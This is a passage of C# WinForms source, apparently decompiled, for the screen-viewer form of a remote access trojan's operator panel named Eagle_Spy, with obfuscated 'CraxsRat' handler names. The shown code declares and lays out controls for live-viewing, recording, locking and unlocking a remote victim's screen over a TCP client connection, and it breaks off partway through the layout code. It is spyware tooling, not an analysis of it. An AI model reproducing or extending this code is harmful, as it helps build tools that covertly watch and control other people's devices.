using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Eagle_Spy.My;
using Eagle_Spy.My.Resources;
using Eagle_Spy.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.Window;

namespace Eagle_Spy;

[DesignerGenerated]
public class ScreenShoter : Form
{
    public delegate void Delegatstoper();

    public delegate void addLogback(object[] objs);

    private IContainer components;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("Livepicbox")]
    private PictureBox _Livepicbox;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("Save")]
    private DrakeUICheckBox _Save;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("Panel2")]
    private Panel _Panel2;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("Panel3")]
    private Panel _Panel3;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("Panel4")]
    private Panel _Panel4;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("Timer1")]
    private Timer _Timer1;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("refreshtimer")]
    private Timer _refreshtimer;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("presstimer")]
    private Timer _presstimer;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("DrakeUIAvatar1")]
    private DrakeUIAvatar _DrakeUIAvatar1;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("scshotbtn")]
    private DrakeUIAvatar _scshotbtn;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("Dismisbtn")]
    private DrakeUIAvatar _Dismisbtn;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("checkblock")]
    private DrakeUICheckBox _checkblock;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("chkctrl")]
    private DrakeUICheckBox _chkctrl;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("StartButton")]
    private DrakeUIAvatar _StartButton;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("StopButton")]
    private DrakeUIAvatar _StopButton;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("DrakeUIAvatar5")]
    private DrakeUIAvatar _DrakeUIAvatar5;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("DrakeUIAvatar6")]
    private DrakeUIAvatar _DrakeUIAvatar6;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("DrakeUIAvatar3")]
    private DrakeUIAvatar _DrakeUIAvatar3;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("DrakeUIAvatar4")]
    private DrakeUIAvatar _DrakeUIAvatar4;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("DrakeUIAvatar7")]
    private DrakeUIAvatar _DrakeUIAvatar7;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("DrakeUIAvatar2")]
    private DrakeUIAvatar _DrakeUIAvatar2;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("DrakeUIAvatar9")]
    private DrakeUIAvatar _DrakeUIAvatar9;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("pinbtn")]
    private DrakeUIButtonIcon _pinbtn;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("PictureBox1")]
    private PictureBox _PictureBox1;

    public TcpClient Client;

    public Client ScreenClass;

    public Client classClient;

    public string DownloadsFolder;

    public Size ScreenSize;

    public bool LIVE;

    public bool ScreenShotFoucs;

    public int Rnew;

    public string Title;

    private static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);

    private const uint SWP_NOSIZE = 1u;

    private const uint SWP_NOMOVE = 2u;

    private const uint TOPMOST_FLAGS = 3u;

    private bool @checked;

    private string[] sizearry;

    private bool Swaping;

    private bool isdown;

    private List<Point> Trakpoint;

    private bool isclick;

    public const int WM_NCLBUTTONDOWN = 161;

    public const int HT_CAPTION = 2;

    public bool recordit;

    private int tiks;

    private object iscontroled;

    private bool keepmeto;

    internal PictureBox Livepicbox
    ;

    [field: AccessedThroughProperty("Label1")]
    internal Label Label1
    ;

    [field: AccessedThroughProperty("Label2")]
    internal Label Label2
    ;

    [field: AccessedThroughProperty("vewpnl")]
    internal Panel vewpnl
    ;

    internal DrakeUICheckBox Save
    ;

    [field: AccessedThroughProperty("Panel1")]
    internal Panel Panel1
    ;

    internal Panel Panel2
    ;
    internal Panel Panel3
;

    internal Panel Panel4
    ;

    [field: AccessedThroughProperty("Panel5")]
    internal Panel Panel5
    ;

    [field: AccessedThroughProperty("Panel6")]
    internal Panel Panel6
    ;

    [field: AccessedThroughProperty("Panel7")]
    internal Panel Panel7
    ;

    [field: AccessedThroughProperty("DrakeUIToolTip1")]
    internal DrakeUIToolTip DrakeUIToolTip1
    ;
    [field: AccessedThroughProperty("PictureBox2")]
    internal PictureBox PictureBox2
    ;

    [field: AccessedThroughProperty("PictureBox3")]
    internal PictureBox PictureBox3
    ;
    internal Timer Timer1
    ;

    [field: AccessedThroughProperty("Label4")]
    internal Label Label4
    ;
    [field: AccessedThroughProperty("Label5")]
    internal Label Label5
    ;

    [field: AccessedThroughProperty("PBS")]
    internal DrakeUIProcessBar PBS
    ;

    internal Timer refreshtimer
    ;

    [field: AccessedThroughProperty("Label7")]
    internal Label Label7
    ;

    [field: AccessedThroughProperty("Label6")]
    internal Label Label6
    ;

    [field: AccessedThroughProperty("combosize")]
    internal DrakeUIComboBox combosize
    ;

    [field: AccessedThroughProperty("Panel8")]
    internal Panel Panel8
    ;

    [field: AccessedThroughProperty("toptitle")]
    internal Label toptitle
    ;

    internal Timer presstimer
    ;







    [field: AccessedThroughProperty("Qualtibox")]
    internal DrakeUIComboBox Qualtibox
         ;


    [field: AccessedThroughProperty("FPSBOX")]
    internal DrakeUIComboBox FPSBOX
        ;

    internal DrakeUIAvatar DrakeUIAvatar1
    ;

    internal DrakeUIAvatar scshotbtn
    ;

    [field: AccessedThroughProperty("SKtype")]
    internal DrakeUIComboBox SKtype
    ;

    internal DrakeUIAvatar Dismisbtn
    ;


    internal DrakeUICheckBox chkctrl
;

    internal DrakeUIAvatar StopButton
    ;

    [field: AccessedThroughProperty("Panel9")]
    internal Panel Panel9
    ;
    internal DrakeUIAvatar DrakeUIAvatar5
    ;


    internal DrakeUIAvatar DrakeUIAvatar6
    ;

    internal DrakeUIAvatar DrakeUIAvatar3
;

    internal DrakeUIAvatar DrakeUIAvatar4
    ;

    internal DrakeUIAvatar DrakeUIAvatar7
    ;

    internal DrakeUIAvatar DrakeUIAvatar2
    ;

    internal DrakeUIAvatar DrakeUIAvatar9
    ;

    internal DrakeUIButtonIcon pinbtn
    ;
    internal ToolTip toolTip1;
    internal Timer timer2;
    internal Timer timer3;
    internal Timer timer4;
    internal Timer timer5;
    internal Timer timer6;
    internal ToolTip toolTip2;
    internal PictureBox pictureBox4;
    internal PictureBox PictureBox15;
    internal PictureBox PictureBox14;
    internal PictureBox PictureBox11;
    internal PictureBox PictureBox10;
    internal Timer timer7;
    internal Timer timer8;
    internal Timer timer9;
    internal Timer timer10;
    internal Sipaa.Framework.SToggleButton checkblock;
    internal Timer timer11;
    internal Sipaa.Framework.SPanel SPanel3;
    internal DrakeUILabel DrakeUILabel2;
    internal DrakeUILabel DrakeUILabel3;
    internal PictureBox pictureBox5;
    internal Panel panel10;
    internal Sipaa.Framework.SPanel SPanel1;
    internal PictureBox pictureBox7;
    internal PictureBox PictureBox9;
    internal PictureBox ClientPic;
    internal DrakeUILabel DrakeUILabel1;
    internal PictureBox Button5;
    internal PictureBox Button7;
    internal PictureBox Button6;
    internal Guna.UI2.WinForms.Guna2Button Enterbutton;
    internal Guna.UI2.WinForms.Guna2Button Guna2Button5;
    internal Guna.UI2.WinForms.Guna2Button StartButton;
    internal Guna.UI2.WinForms.Guna2Button Guna2Button2;
    internal Panel panel12;
    private Guna.UI2.WinForms.Guna2TextBox textsend;
    private Label label3;
    private Label label8;
    private Label label9;
    internal PictureBox pictureBox6;
    internal DrakeUILabel drakeUILabel4;
    internal DrakeUIComboBox drakeUIComboBox1;
    internal DrakeUICheckBox drakeUICheckBox1;
    internal DrakeUILabel drakeUILabel5;
    internal DrakeUILabel drakeUILabel6;
    internal PictureBox pictureBox8;
    internal PictureBox pictureBox12;
    internal PictureBox pictureBox16;
    internal PictureBox pictureBox13;
    internal PictureBox pictureBox17;
    internal PictureBox pictureBox18;
    internal PictureBox PictureBox1
    ;

    public ScreenShoter()
    {
        base.Load += CraxsRatkfvuiorkenfudpajrsnCraxsRatskjasnhfcs;
        base.FormClosing += CraxsRatkfvuiorkenfudpajrsnCraxsRatsxscajhg;
        base.KeyDown += ScreenShoter_KeyDown_1;
        ScreenShotFoucs = false;
        Rnew = 0;
        Title = "null";
        @checked = false;
        sizearry = new string[38]
        {
            "Auto", "2560x1600", "2048x1536", "1920x1200", "1920x1152", "1920x1080", "1600x1200", "1600x900", "1440x904", "1366x768",
            "1360x768", "1280x960", "1280x800", "1280x768", "1280x720", "1279x720", "1152x720", "1080x607", "1024x960", "1024x770",
            "1024x768", "1024x600", "960x640", "960x600", "960x540", "864x480", "854x480", "800x600", "800x480", "768x576",
            "640x480", "640x360", "480x320", "432x240", "450x300", "400x240", "320x240", "280x280"
        };
        Swaping = false;
        isdown = false;
        isclick = false;
        recordit = false;
        tiks = 0;
        iscontroled = false;
        keepmeto = false;
        InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
        try
        {
            if (disposing && components != null)
                components.Dispose();
        }
        finally
        {
            base.Dispose(disposing);
        }
    }

    [System.Diagnostics.DebuggerStepThrough]
    private void InitializeComponent()
    {
            this.components = new System.ComponentModel.Container();
            this.Save = new DrakeUI.Framework.DrakeUICheckBox();
            this.Label2 = new System.Windows.Forms.Label();
            this.Label1 = new System.Windows.Forms.Label();
            this.vewpnl = new System.Windows.Forms.Panel();
            this.Panel8 = new System.Windows.Forms.Panel();
            this.toptitle = new System.Windows.Forms.Label();
            this.PBS = new DrakeUI.Framework.DrakeUIProcessBar();
            this.Panel1 = new System.Windows.Forms.Panel();
            this.Panel2 = new System.Windows.Forms.Panel();
            this.pinbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.DrakeUIAvatar9 = new DrakeUI.Framework.DrakeUIAvatar();
            this.DrakeUIAvatar1 = new DrakeUI.Framework.DrakeUIAvatar();
            this.Panel3 = new System.Windows.Forms.Panel();
            this.Panel4 = new System.Windows.Forms.Panel();
            this.Panel5 = new System.Windows.Forms.Panel();
            this.DrakeUIAvatar2 = new DrakeUI.Framework.DrakeUIAvatar();
            this.Panel6 = new System.Windows.Forms.Panel();
            this.Panel7 = new System.Windows.Forms.Panel();
            this.DrakeUIAvatar7 = new DrakeUI.Framework.DrakeUIAvatar();
            this.combosize = new DrakeUI.Framework.DrakeUIComboBox();
            this.Label7 = new System.Windows.Forms.Label();
            this.Label6 = new System.Windows.Forms.Label();
            this.Label5 = new System.Windows.Forms.Label();
            this.Label4 = new System.Windows.Forms.Label();
            this.Dismisbtn = new DrakeUI.Framework.DrakeUIAvatar();
            this.SKtype = new DrakeUI.Framework.DrakeUIComboBox();
            this.scshotbtn = new DrakeUI.Framework.DrakeUIAvatar();
            this.StopButton = new DrakeUI.Framework.DrakeUIAvatar();
            this.Panel9 = new System.Windows.Forms.Panel();
            this.DrakeUIAvatar5 = new DrakeUI.Framework.DrakeUIAvatar();
            this.DrakeUIAvatar6 = new DrakeUI.Framework.DrakeUIAvatar();
            this.DrakeUIAvatar4 = new DrakeUI.Framework.DrakeUIAvatar();
            this.DrakeUIAvatar3 = new DrakeUI.Framework.DrakeUIAvatar();
            this.FPSBOX = new DrakeUI.Framework.DrakeUIComboBox();
            this.chkctrl = new DrakeUI.Framework.DrakeUICheckBox();
            this.Qualtibox = new DrakeUI.Framework.DrakeUIComboBox();
            this.DrakeUIToolTip1 = new DrakeUI.Framework.DrakeUIToolTip(this.components);
            this.Timer1 = new System.Windows.Forms.Timer(this.components);
            this.refreshtimer = new System.Windows.Forms.Timer(this.components);
            this.presstimer = new System.Windows.Forms.Timer(this.components);
            this.toolTip1 = new System.Windows.Forms.ToolTip(this.components);
            this.timer2 = new System.Windows.Forms.Timer(this.components);
            this.timer3 = new System.Windows.Forms.Timer(this.components);
            this.timer4 = new System.Windows.Forms.Timer(this.components);
            this.timer5 = new System.Windows.Forms.Timer(this.components);
            this.timer6 = new System.Windows.Forms.Timer(this.components);
            this.toolTip2 = new System.Windows.Forms.ToolTip(this.components);
            this.timer7 = new System.Windows.Forms.Timer(this.components);
            this.timer8 = new System.Windows.Forms.Timer(this.components);
            this.timer9 = new System.Windows.Forms.Timer(this.components);
            this.timer10 = new System.Windows.Forms.Timer(this.components);
            this.checkblock = new Sipaa.Framework.SToggleButton();
            this.timer11 = new System.Windows.Forms.Timer(this.components);
            this.SPanel3 = new Sipaa.Framework.SPanel();
            this.label9 = new System.Windows.Forms.Label();
            this.label8 = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.DrakeUILabel2 = new DrakeUI.Framework.DrakeUILabel();
            this.DrakeUILabel3 = new DrakeUI.Framework.DrakeUILabel();
            this.panel10 = new System.Windows.Forms.Panel();
            this.SPanel1 = new Sipaa.Framework.SPanel();
            this.textsend = new Guna.UI2.WinForms.Guna2TextBox();
            this.DrakeUILabel1 = new DrakeUI.Framework.DrakeUILabel();
            this.panel12 = new System.Windows.Forms.Panel();
            this.drakeUILabel4 = new DrakeUI.Framework.DrakeUILabel();
            this.drakeUILabel5 = new DrakeUI.Framework.DrakeUILabel();
            this.drakeUILabel6 = new DrakeUI.Framework.DrakeUILabel();
            this.drakeUICheckBox1 = new DrakeUI.Framework.DrakeUICheckBox();
            this.drakeUIComboBox1 = new DrakeUI.Framework.DrakeUIComboBox();
            this.pictureBox18 = new System.Windows.Forms.PictureBox();
            this.PictureBox14 = new System.Windows.Forms.PictureBox();
            this.pictureBox8 = new System.Windows.Forms.PictureBox();
            this.PictureBox10 = new System.Windows.Forms.PictureBox();
            this.pictureBox5 = new System.Windows.Forms.PictureBox();
            this.Livepicbox = new System.Windows.Forms.PictureBox();
            this.pictureBox6 = new System.Windows.Forms.PictureBox();
            this.ClientPic = new System.Windows.Forms.PictureBox();
            this.Enterbutton = new Guna.UI2.WinForms.Guna2Button();
            this.pictureBox13 = new System.Windows.Forms.PictureBox();
            this.pictureBox17 = new System.Windows.Forms.PictureBox();
            this.pictureBox12 = new System.Windows.Forms.PictureBox();
            this.pictureBox16 = new System.Windows.Forms.PictureBox();
            this.PictureBox9 = new System.Windows.Forms.PictureBox();
            this.Guna2Button5 = new Guna.UI2.WinForms.Guna2Button();
            this.PictureBox11 = new System.Windows.Forms.PictureBox();
            this.pictureBox7 = new System.Windows.Forms.PictureBox();
            this.PictureBox3 = new System.Windows.Forms.PictureBox();
            this.PictureBox2 = new System.Windows.Forms.PictureBox();
            this.PictureBox1 = new System.Windows.Forms.PictureBox();
            this.Button5 = new System.Windows.Forms.PictureBox();
            this.Button7 = new System.Windows.Forms.PictureBox();
            this.StartButton = new Guna.UI2.WinForms.Guna2Button();
            this.Guna2Button2 = new Guna.UI2.WinForms.Guna2Button();
            this.Button6 = new System.Windows.Forms.PictureBox();
            this.pictureBox4 = new System.Windows.Forms.PictureBox();
            this.PictureBox15 = new System.Windows.Forms.PictureBox();
            this.vewpnl.SuspendLayout();
            this.Panel8.SuspendLayout();
            this.Panel1.SuspendLayout();
            this.Panel2.SuspendLayout();
            this.Panel5.SuspendLayout();
            this.Panel6.SuspendLayout();
            this.Panel7.SuspendLayout();
            this.Panel9.SuspendLayout();
            this.SPanel3.SuspendLayout();
            this.SPanel1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox18)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox14)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox8)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox10)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox5)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Livepicbox)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox6)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.ClientPic)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox13)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox17)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox12)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox16)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox9)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox11)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox7)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox3)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox2)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox1)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Button5)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Button7)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Button6)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox4)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox15)).BeginInit();
            this.SuspendLayout();
            // 
            // Save
            // 
            this.Save.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Save.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Save.Font = new System.Drawing.Font("Calibri", 10F);
            this.Save.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Save.Location = new System.Drawing.Point(15, 151);
            this.Save.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.Save.Name = "Save";
            this.Save.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
            this.Save.Size = new System.Drawing.Size(42, 39);
            this.Save.Style = DrakeUI.Framework.UIStyle.Custom;
            this.Save.StyleCustomMode = true;
            this.Save.TabIndex = 19;
            this.Save.TextAlign = System.Drawing.ContentAlignment.TopLeft;
            this.DrakeUIToolTip1.SetToolTip(this.Save, "Record Screen");
            this.Save.MouseClick += new System.Windows.Forms.MouseEventHandler(this.Save_MouseClick);
            // 
            // Label2
            // 
            this.Label2.Font = new System.Drawing.Font("Calibri", 10F);
            this.Label2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Label2.Location = new System.Drawing.Point(0, 508);
            this.Label2.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.Label2.Name = "Label2";
            this.Label2.Size = new System.Drawing.Size(112, 24);
            this.Label2.TabIndex = 18;
            this.Label2.Text = "FPS .";
            this.Label2.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // Label1
            // 
            this.Label1.Font = new System.Drawing.Font("Calibri", 10F);
            this.Label1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Label1.Location = new System.Drawing.Point(0, 582);
            this.Label1.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.Label1.Name = "Label1";
            this.Label1.Size = new System.Drawing.Size(112, 24);
            this.Label1.TabIndex = 15;
            this.Label1.Text = "Qualty";
            this.Label1.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // vewpnl
            // 
            this.vewpnl.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.vewpnl.Controls.Add(this.panel10);
            this.vewpnl.Controls.Add(this.pictureBox5);
            this.vewpnl.Controls.Add(this.panel12);
            this.vewpnl.Location = new System.Drawing.Point(0, 0);
            this.vewpnl.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.vewpnl.Name = "vewpnl";
            this.vewpnl.Size = new System.Drawing.Size(441, 834);
            this.vewpnl.TabIndex = 2;
            // 
            // Panel8
            // 
            this.Panel8.BackColor = System.Drawing.Color.Black;
            this.Panel8.Controls.Add(this.vewpnl);
            this.Panel8.Location = new System.Drawing.Point(11, 56);
            this.Panel8.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.Panel8.Name = "Panel8";
            this.Panel8.Size = new System.Drawing.Size(441, 834);
            this.Panel8.TabIndex = 2;
            // 
            // toptitle
            // 
            this.toptitle.Font = new System.Drawing.Font("Calibri", 9F);
            this.toptitle.ForeColor = System.Drawing.Color.Lime;
            this.toptitle.Location = new System.Drawing.Point(11, 60);
            this.toptitle.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.toptitle.Name = "toptitle";
            this.toptitle.Size = new System.Drawing.Size(441, 834);
            this.toptitle.TabIndex = 21;
            this.toptitle.Text = "...";
            this.toptitle.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // PBS
            // 
            this.PBS.Dock = System.Windows.Forms.DockStyle.Top;
            this.PBS.FillColor = System.Drawing.Color.Black;
            this.PBS.Font = new System.Drawing.Font("Calibri", 12F);
            this.PBS.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.PBS.Location = new System.Drawing.Point(0, 0);
            this.PBS.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.PBS.MinimumSize = new System.Drawing.Size(80, 26);
            this.PBS.Name = "PBS";
            this.PBS.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.PBS.ShowValue = false;
            this.PBS.Size = new System.Drawing.Size(441, 26);
            this.PBS.Style = DrakeUI.Framework.UIStyle.Custom;
            this.PBS.TabIndex = 2;
            this.PBS.Text = "0.0%";
            // 
            // Panel1
            // 
            this.Panel1.BackColor = System.Drawing.Color.Black;
            this.Panel1.Controls.Add(this.PBS);
            this.Panel1.Location = new System.Drawing.Point(18, 62);
            this.Panel1.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.Panel1.Name = "Panel1";
            this.Panel1.Size = new System.Drawing.Size(441, 847);
            this.Panel1.TabIndex = 2;
            // 
            // Panel2
            // 
            this.Panel2.BackColor = System.Drawing.Color.Transparent;
            this.Panel2.Controls.Add(this.pinbtn);
            this.Panel2.Controls.Add(this.DrakeUIAvatar9);
            this.Panel2.Controls.Add(this.DrakeUIAvatar1);
            this.Panel2.Controls.Add(this.PictureBox3);
            this.Panel2.Controls.Add(this.PictureBox2);
            this.Panel2.Location = new System.Drawing.Point(0, 0);
            this.Panel2.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.Panel2.Name = "Panel2";
            this.Panel2.Size = new System.Drawing.Size(477, 62);
            this.Panel2.TabIndex = 2;
            this.Panel2.MouseDown += new System.Windows.Forms.MouseEventHandler(this.Panel2_MouseDown);
            // 
            // pinbtn
            // 
            this.pinbtn.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.pinbtn.BackColor = System.Drawing.Color.Black;
            this.pinbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.pinbtn.FillColor = System.Drawing.Color.Black;
            this.pinbtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.pinbtn.ForeColor = System.Drawing.Color.Red;
            this.pinbtn.Location = new System.Drawing.Point(141, 14);
            this.pinbtn.Name = "pinbtn";
            this.pinbtn.RectColor = System.Drawing.Color.Transparent;
            this.pinbtn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.pinbtn.Size = new System.Drawing.Size(56, 44);
            this.pinbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.pinbtn.Symbol = 61581;
            this.pinbtn.SymbolSize = 30;
            this.pinbtn.TabIndex = 30;
            this.pinbtn.TagString = "";
            this.DrakeUIToolTip1.SetToolTip(this.pinbtn, "PIN");
            this.pinbtn.Click += new System.EventHandler(this.DrakeUIButtonIcon1_Click);
            // 
            // DrakeUIAvatar9
            // 
            this.DrakeUIAvatar9.AvatarSize = 30;
            this.DrakeUIAvatar9.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIAvatar9.FillColor = System.Drawing.Color.Transparent;
            this.DrakeUIAvatar9.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIAvatar9.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIAvatar9.Location = new System.Drawing.Point(316, 15);
            this.DrakeUIAvatar9.Name = "DrakeUIAvatar9";
            this.DrakeUIAvatar9.Size = new System.Drawing.Size(56, 44);
            this.DrakeUIAvatar9.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIAvatar9.Symbol = 61758;
            this.DrakeUIAvatar9.SymbolSize = 30;
            this.DrakeUIAvatar9.TabIndex = 3;
            this.DrakeUIAvatar9.Text = "DrakeUIAvatar9";
            this.DrakeUIToolTip1.SetToolTip(this.DrakeUIAvatar9, "UnLock Screen");
            this.DrakeUIAvatar9.Click += new System.EventHandler(this.DrakeUIAvatar9_Click);
            // 
            // DrakeUIAvatar1
            // 
            this.DrakeUIAvatar1.AvatarSize = 30;
            this.DrakeUIAvatar1.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIAvatar1.FillColor = System.Drawing.Color.Transparent;
            this.DrakeUIAvatar1.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIAvatar1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIAvatar1.Location = new System.Drawing.Point(380, 15);
            this.DrakeUIAvatar1.Name = "DrakeUIAvatar1";
            this.DrakeUIAvatar1.Size = new System.Drawing.Size(56, 44);
            this.DrakeUIAvatar1.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIAvatar1.Symbol = 61475;
            this.DrakeUIAvatar1.SymbolSize = 30;
            this.DrakeUIAvatar1.TabIndex = 2;
            this.DrakeUIAvatar1.Text = "DrakeUIAvatar1";
            this.DrakeUIToolTip1.SetToolTip(this.DrakeUIAvatar1, "Lock Screen");
            this.DrakeUIAvatar1.Click += new System.EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsjkhsdawe);
            // 
            // Panel3
            // 
            this.Panel3.BackColor = System.Drawing.Color.Transparent;
            this.Panel3.Dock = System.Windows.Forms.DockStyle.Right;
            this.Panel3.Location = new System.Drawing.Point(86, 0);
            this.Panel3.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.Panel3.Name = "Panel3";
            this.Panel3.Size = new System.Drawing.Size(18, 16);
            this.Panel3.TabIndex = 3;
            this.Panel3.MouseDown += new System.Windows.Forms.MouseEventHandler(this.Panel3_MouseDown);
            // 
            // Panel4
            // 
            this.Panel4.BackColor = System.Drawing.Color.Transparent;
            this.Panel4.Location = new System.Drawing.Point(0, 62);
            this.Panel4.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.Panel4.Name = "Panel4";
            this.Panel4.Size = new System.Drawing.Size(18, 847);
            this.Panel4.TabIndex = 4;
            this.Panel4.MouseDown += new System.Windows.Forms.MouseEventHandler(this.Panel4_MouseDown);
            // 
            // Panel5
            // 
            this.Panel5.BackColor = System.Drawing.Color.Transparent;
            this.Panel5.Controls.Add(this.DrakeUIAvatar2);
            this.Panel5.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.Panel5.Location = new System.Drawing.Point(0, 16);
            this.Panel5.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.Panel5.Name = "Panel5";
            this.Panel5.Size = new System.Drawing.Size(104, 66);
            this.Panel5.TabIndex = 4;
            // 
            // DrakeUIAvatar2
            // 
            this.DrakeUIAvatar2.AvatarSize = 45;
            this.DrakeUIAvatar2.Cursor = System.Windows.Forms.Cursors.Hand;
